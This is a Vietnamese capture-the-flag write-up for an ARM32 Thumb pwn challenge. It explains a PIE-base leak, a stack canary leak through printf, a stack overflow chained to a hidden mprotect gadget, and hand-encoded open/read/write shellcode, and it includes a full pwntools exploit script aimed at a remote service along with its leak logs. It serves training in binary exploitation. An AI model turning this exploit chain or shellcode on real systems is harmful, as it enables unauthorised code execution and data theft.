---
title: "PWN#Alpha"
category: "Pwn"
tags: ["arm32", "thumb-2", "stack-buffer-overflow", "canary-leak", "mprotect", "shellcode", "orw"]
solve_date: "2026-10-14T14:00:00+07:00"
language: "vi"
points: 170
---

# PWN#Alpha — stack smash ARM32 Thumb tới mprotect rồi ORW

**Flag:** CTF{3183b60e20b34af6528ff443e52b0445COBE}  
**Service:** nc 169.58.126.107 5004  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| vault (ELF32 ARM EABI5, stripped) | 67,244 | ebada74666f8e1e91ee8994093fd65718ea464c418b5c78d22d00160c6cf09e7 |

## Đề bài

> PWN#Alpha — 170 điểm. Lấy shell trên host từ xa và đọc flag.

Handout là vault 32-bit ARM Thumb-2 PIE, dynamic link với /lib/ld-linux-armhf.so.3 và đã strip. Service in dòng debug có code pointer, hỏi tên, echo lại bằng printf("Hello, %s\n", buf), rồi đọc message dài hơn vào cùng stack buffer trước khi in Message received.

Remote tắt ASLR: PIE base luôn là 0x40000000 và stack frame có địa chỉ cố định. Tuy nhiên stack canary đổi mỗi kết nối, nên phải leak lại mỗi lần.

## Phân tích

### Protections và imports

vault dùng PIE, Partial RELRO (.got tại 0x20000 ghi được), NX (GNU_STACK là RW) và stack canary (__stack_chk_guard/__stack_chk_fail). Chỉ import read, printf, puts, setvbuf, abort và __libc_start_main@GLIBC_2.34 — không có system hay execve. Build bằng GCC Debian 14.3.0-5 cho ARM EABI5 hard-float.

Toàn bộ .text là Thumb-2 nên entry point là địa chỉ lẻ 0x9e1. Static tool decode file theo ARM mode sẽ cho kết quả sai; cần disassemble .text (file offset 0x594, 1156 byte) theo Thumb mode.

### Hàm lỗi tại 0x89a

Hàm đọc hai lần vào cùng buffer stack 64 byte tại r7+4:

```text
0x8bc  printf("[debug] build id: %p\n", base+0x945)   <- PIE leak
0x8c8  read(0, r7+4, 0x41)                            <- 65 bytes: one byte past the buffer
0x8d6  printf("Hello, %s\n", r7+4)                    <- %s over-read: canary + saved regs
0x8f2  read(0, r7+4, 0x96)                            <- 150 bytes: full stack smash
0x8fc  puts("Message received.")
```

Frame: buf ở buf+0, canary ở buf+64, saved r7 ở buf+68, saved return address ở buf+72. Lần read thứ hai nhận 150 byte, dư 78 byte so với khoảng cách tới saved link register; nó cũng nhận byte NUL.

Format string và prompt được XOR-obfuscate trong .data bằng key 4 byte 0x91c4ef87; giải mã ra đúng layout trên:

```text
Enter your name:
Leave a message for the vault keeper:
Message received.
[debug] build id: %p
Hello, %s
```

### Leak 1 — PIE base

Dòng debug in địa chỉ code ngay sau call, base+0x945, nên base = leaked - 0x945. Trên remote luôn là 0x40000945, tức base = 0x40000000.

### Leak 2 — canary, saved r7, saved lr

Byte thấp của canary là 0x00, vì thế tên dài 64 byte khiến %s dừng đúng tại canary. Gửi 65 byte sẽ ghi đè byte 0 này; %s tiếp tục in 3 byte canary còn lại, saved r7 (stack address) và các byte thấp của saved lr tới khi gặp NUL. Phần cuối phản hồi:

```text
...AAAAAAAA\xf7\xa9\x98\xe0\xfb\xff?w\t
```

Do đó canary = 00 f7 a9 98, saved r7 = 0x3ffffbe0 và saved lr = ...0977 (0x40000977). buf nằm thấp hơn saved r7 0x4c byte, nên buf = 0x3ffffb94 — không đổi giữa các kết nối. Vì một byte canary có thể là 0x00, leak được thử lại cho tới khi marker saved_r7 || lr_low (e0 fb ff 3f 77 09) xuất hiện.

### Gadget mprotect ẩn tại 0x9c2

Đuôi của routine obfuscation cũng dùng được như gadget:

```text
0x9c2  mov  r0, r3
0x9c4  movw r1, #0xf000
0x9c8  movt r1, #0xffff
0x9cc  ands r0, r1          ; r0 = r3 & 0xfffff000  (page-align)
0x9ce  movs r1, #1
0x9d0  lsls r1, r1, #0xc    ; r1 = 0x1000
0x9d2  movs r2, #7          ; r2 = PROT_READ|WRITE|EXEC
0x9d4  movw r7, #0x7d       ; __NR_mprotect (125)
0x9d8  svc  #0
0x9da  add.w r3, r3, #1
0x9de  bx   r3
```

Nó page-align r3, gọi mprotect(page, 0x1000, RWX), rồi nhảy tới r3+1. Bit thấp được bx dùng để chuyển sang Thumb state; đặt r3 = buf thì lệnh thực thi từ buf theo Thumb. Như vậy stack page chứa buffer thành executable và control được chuyển tới shellcode ngay đầu payload — không cần libc leak.

### Vì sao dùng open/read/write thay vì shell

execve không hoạt động trên target. Thử argv = [filename, NULL], envp = [NULL], rồi envp thật ["PATH=/usr/bin:/bin"] đều trả -22 (EINVAL); probe riêng với ARM execve syscall số 11 làm connection chết. Các syscall khác vẫn bình thường — write, mprotect, time trả kết quả hợp lý, syscall giả trả -14 (EFAULT) — nên đây không phải seccomp filter; môi trường không cho exec. Vì đã có arbitrary code execution, flag được đọc trực tiếp qua open/read/write.

## Lời giải

### 1. Leak base, canary và stack

Kết nối, parse [debug] build id: 0x... để lấy base, gửi 65 byte, tìm marker trong đoạn Hello, ..., rồi khôi phục canary = b'\x00' + blob[i-3:i] và buf = saved_r7 - 0x4c.

### 2. Đặt layout cho frame 150 byte

```text
buf+0   .. buf+35   Thumb shellcode (36 bytes, open/read/write)
buf+36  .. buf+39   0x90 filler
buf+40  .. buf+54   "/flag/flag.txt\0"
buf+64  .. buf+67   leaked canary
buf+68  .. buf+71   saved r7 (unused)
buf+72  .. buf+75   base+0x677   pop {r3, pc}
buf+76  .. buf+79   buf           -> r3
buf+80  .. buf+83   base+0x9c3   mprotect gadget (Thumb bit set)
buf+84  .. buf+149  filler
```

Lần read thứ hai return; epilogue so canary, khôi phục sp và pop lr đã bị overwrite, rồi chain chạy.

### 3. Shellcode

Shellcode Thumb được encode thủ công (máy phân tích không có cross-as hay keystone nên từng encoding được brute-force và kiểm tra bằng capstone). Lúc vào, r3 = buf+1, vì vậy add.w r3, r3, #0x27 đặt r3 trỏ tới path string ở buf+40:

```text
add.w r3, r3, #0x27   ; r3 = buf+40 (path)
mov   r0, r3
movs  r1, #0
movs  r2, #0
movs  r7, #5          ; open(path, 0, 0)
svc   #0
add.w r1, r3, #40     ; buf+80
movs  r2, #250
movs  r7, #3          ; read(fd, buf+80, 250)  - fd still in r0
svc   #0
movs  r0, #1
add.w r1, r3, #40
movs  r2, #250
movs  r7, #4          ; write(1, buf+80, 250)
svc   #0
```

### 4. Tìm đường dẫn flag

Các path dễ đoán không đúng. open("/flag") thành công (fd = 5) nhưng read trả -21 (EISDIR) — /flag là thư mục. Liệt kê bằng getdents64 (syscall 217) được ['.', '..', 'flag.txt']; file thật là /flag/flag.txt.

## Mã khai thác

```python
#!/usr/bin/env python3
# PWN#Alpha - ARM32 (Thumb) PIE + PartialRELRO + NX + StackCanary, ASLR off.
# Leak:  printf("[debug] build id: %p", code_ptr) -> PIE base
#        printf("Hello, %s", name_buf) -> stack canary (byte0=0x00) + saved r7 -> buf addr
# Primitive: read(0, buf, 0x96) overflows buf -> overwrite saved LR (ret addr) past canary.
# Exec: hidden Thumb gadget mprotects buf's stack page RWX then 'bx r3' jumps into our shellcode.
# Shellcode: open/read/write -> read /flag/flag.txt  (execve kept returning EINVAL in this env)
from pwn import *
from capstone import Cs, CS_ARCH_ARM, CS_MODE_THUMB
import re
context(arch='arm', os='linux', log_level='error')

_md=Cs(CS_ARCH_ARM,CS_MODE_THUMB)
def b1(h): return bytes([h&0xff,(h>>8)&0xff])
def movs(rd,imm): return b1(0x2000|(rd<<8)|imm)
def mov(a,b): return b1(0x4600|(b<<3)|a)
def str_(rd,rn,off): return b1(0x6000|((off>>2)<<6)|(rn<<3)|rd)
def svc(): return b1(0xdf00)
def addw(rd,rn,imm):
    h1=0xF100|(((imm>>11)&1)<<10)|(rn&0xf)
    h2=(((imm>>8)&7)<<12)|((rd&0xf)<<8)|(imm&0xff)
    return b1(h1)+b1(h2)

HOST,PORT="169.58.126.107",5004
FLAG="/flag/flag.txt"
MARKER=b'\xe0\xfb\xff\x3f\x77\x09'      # constant saved_r7 + saved_lr low bytes (ASLR off)
RET_POP   = 0x676|1                     # pop {r3, pc}
GAD_MPROT = 0x9c2|1                     # mov r0,r3; mprotect(page,0x1000,RWX); add r3,#1; bx r3

def orw_shellcode():
    # r3=buf+1 at entry. open(path@buf+40) ; read(fd, buf+80, 250) ; write(1, buf+80, 250)
    return (addw(3,3,39)
            + mov(0,3) + movs(1,0) + movs(2,0) + movs(7,5) + svc()
            + addw(1,3,40) + movs(2,250) + movs(7,3) + svc()
            + movs(0,1) + addw(1,3,40) + movs(2,250) + movs(7,4) + svc())

def connect_and_leak():
    r=remote(HOST,PORT,timeout=20)
    banner=r.recvuntil(b"Enter your name: ",timeout=10)
    base=int(re.search(rb"0x([0-9a-f]+)",banner).group(1),16)-0x945
    r.send(b"A"*65)                       # overwrite canary[0] so %s leaks canary[1..]+regs
    blob=r.recvuntil(b"vault keeper: ",timeout=10)
    i=blob.find(MARKER)
    if i<3:
        r.close(); return None
    canary=b'\x00'+blob[i-3:i]
    buf=u32(MARKER[0:4])-0x4c             # buffer address (r7 of vuln + 4)
    return r,base,canary,buf

def build_payload(base,buf,canary):
    sc=orw_shellcode(); assert len(sc)<=40
    b=bytearray(b'\x00'*150)
    b[84:150]=b'D'*66
    b[0:len(sc)]=sc
    b[40:40+len(FLAG)+1]=FLAG.encode()+b'\x00'
    b[64:68]=canary
    b[72:76]=p32(base+RET_POP)
    b[76:80]=p32(buf)
    b[80:84]=p32(base+GAD_MPROT)
    return bytes(b)

def main():
    for t in range(1,80):
        got=connect_and_leak()
        if not got: continue
        r,base,canary,buf=got
        r.send(build_payload(base,buf,canary))
        try: r.recvuntil(b"Message received.\n",timeout=5)
        except Exception: pass
        try: d=r.recv(timeout=5)
        except Exception: d=b''
        r.close()
        if d and d[:4]!=b'\xc3\t':
            flag=d.split(b'\n',1)[0].decode(errors='replace')
            print("[+] attempts=%d base=%#x buf=%#x"%(t,base,buf))
            print("[+] FLAG ->",flag)
            return
    print("[-] failed")

if __name__=="__main__":
    main()
```

## Kết quả

Hành vi leak trên remote (tên 65 byte):

```text
BANNER: b'[debug] build id: 0x40000945\nEnter your name: '
RESP raw: b'Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf7\xa9\x98\xe0\xfb\xff?w\t\nLeave'
```

Các byte sau 65 ký tự A là đuôi canary f7 a9 98, saved r7 e0 fb ff 3f (0x3ffffbe0) và byte thấp của saved lr 77 09.

Khám phá đường dẫn: probe chỉ gọi open rồi ghi fd trả về:

```text
/bin/sh          open->5
/etc/passwd      open->5
/flag            open->5
/flag.txt        open->-2
```

/flag mở được nhưng đọc thất bại, nên đó là thư mục:

```text
== /flag (tries=0) fd=5 read=-21
files in /flag: ['.', '..', 'flag.txt']
```

Đọc nội dung /flag/flag.txt (dump 250 byte được cắt sau newline để vừa khung; phần sau là D padding cũ và các stack word đã có trong buffer):

```text
=== /flag/flag.txt ===
b'CTF{3183b60e20b34af6528ff443e52b0445COBE}\nDDDDDDDDDDDDDDDDDDDDDDDDDDDD\x00\x00...'
--- clean ---
CTF{3183b60e20b34af6528ff443e52b0445COBE}
```

Chạy lại script tổng hợp:

```text
[+] attempts=1 base=0x40000000 buf=0x3ffffb94
[+] FLAG -> CTF{3183b60e20b34af6528ff443e52b0445COBE}
```

File flag trên remote thực sự có đuôi COBE} bên trong ngoặc nhọn; đây là nội dung /flag/flag.txt chứ không phải lỗi chép.

## Ghi chú

* Tên dài 65 byte là toàn bộ canary leak: 64 byte làm %s dừng tại null byte của canary, thêm một byte nữa xóa terminator. Nếu byte 1–3 của canary có 0x00 thì chuỗi dừng sớm, find(MARKER) thất bại và script phải kết nối lại để lấy canary mới.
* ASLR tắt nên đây là one-shot: base 0x40000000 và buf 0x3ffffb94 cố định. Canary thay đổi mỗi kết nối nên vẫn phải leak lại.
* execve trả EINVAL với mọi dạng argv/envp đã thử, còn write và mprotect hoạt động; đây không phải seccomp. Không nên cố lấy shell trên target này.
* /flag là thư mục. open thành công nhưng read trả -21; getdents64 (syscall 217) tìm thấy flag.txt.
* Shellcode tối đa 40 byte vì path string nằm tại buf+40. Lúc vào r3 = buf+1 (Thumb bit), nên add.w r3, r3, #0x27 tới buf+40; read/write dùng buf+80.
* Máy phân tích không có ARM cross-as hay keystone, nên từng Thumb instruction được encode thủ công và đối chiếu bằng capstone; sai encoding add.w/movw có thể tạo instruction hợp lệ nhưng khác ý muốn.
* Truyền file path bên trong script, không truyền qua argv trong Git Bash for Windows — chuỗi "/bin/sh" trong sys.argv bị đổi thành C:/Program Files/Git/bin/sh khiến probe sai.
* Hai ngõ cụt (execve trả EINVAL, /flag là thư mục) ban đầu đều trông như output rỗng. Probe chỉ gọi open rồi in fd giúp phân biệt path sai với shellcode chain lỗi ngay trong một lần thử.
